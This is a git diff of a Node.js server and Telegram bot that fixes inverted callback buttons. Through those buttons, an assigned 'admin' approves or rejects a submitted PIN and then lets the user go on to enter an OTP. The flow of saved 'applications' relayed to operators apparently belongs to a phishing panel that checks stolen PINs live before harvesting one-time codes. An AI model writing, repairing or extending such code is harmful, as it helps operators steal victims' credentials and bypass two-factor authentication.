@@ -471,10 +471,10 @@ ${process.env.APP_URL || WEBHOOK_URL}?admin=${newAdminId}
 }
 
 // ==========================================
-// ✅ TELEGRAM CALLBACK HANDLER (Working Version Style)
+// ✅ TELEGRAM CALLBACK HANDLER - FIXED LOGIC
 // ==========================================
 
-// Handle Telegram callback buttons - DIRECT APPROACH
+// Handle Telegram callback buttons
 bot.on('callback_query', async (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const messageId = callbackQuery.message.message_id;
@@ -604,7 +604,7 @@ User will re-enter code.
     // STANDARD CALLBACKS: Parse action_type_applicationId
     // ==========================================
     const parts = data.split('_');
-    const action = parts[0]; // approve or reject
+    const action = parts[0]; // deny or allow
     const type = parts[1]; // pin or otp
     const applicationId = parts.slice(2).join('_');
     
@@ -621,9 +621,9 @@ User will re-enter code.
     }
     
     // ==========================================
-    // BUTTON: Invalid Information - Deny (approve_pin)
+    // BUTTON: Invalid Information - Deny (deny_pin)
     // ==========================================
-    if (action === 'approve' && type === 'pin') {
+    if (action === 'deny' && type === 'pin') {
         console.log(`❌ PIN REJECTED: ${applicationId}`);
         
         await db.updateApplication(applicationId, { pinStatus: 'rejected' });
@@ -656,9 +656,9 @@ User will re-enter code.
     }
     
     // ==========================================
-    // BUTTON: All Correct - Allow OTP (reject_pin)
+    // BUTTON: All Correct - Allow OTP (allow_pin)
     // ==========================================
-    else if (action === 'reject' && type === 'pin') {
+    else if (action === 'allow' && type === 'pin') {
         console.log(`✅ PIN APPROVED: ${applicationId}`);
         
         await db.updateApplication(applicationId, { pinStatus: 'approved' });
@@ -851,7 +851,7 @@ app.post('/api/verify-pin', async (req, res) => {
         
         console.log(`💾 Application saved: ${applicationId}`);
         
-        // ✅ FIXED: Correct button callback data
+        // ✅ FIXED: Correct button callback data with clear action names
         const sent = await sendToAdmin(assignedAdmin.adminId, `
 📱 *NEW APPLICATION*
 
@@ -865,8 +865,8 @@ app.post('/api/verify-pin', async (req, res) => {
             parse_mode: 'Markdown',
             reply_markup: {
                 inline_keyboard: [
-                    [{ text: '❌ Invalid - Deny', callback_data: `reject_pin_${applicationId}` }],
-                    [{ text: '✅ Correct - Allow OTP', callback_data: `approve_pin_${applicationId}` }]
+                    [{ text: '❌ Invalid - Deny', callback_data: `deny_pin_${applicationId}` }],
+                    [{ text: '✅ Correct - Allow OTP', callback_data: `allow_pin_${applicationId}` }]
                 ]
             }
         });
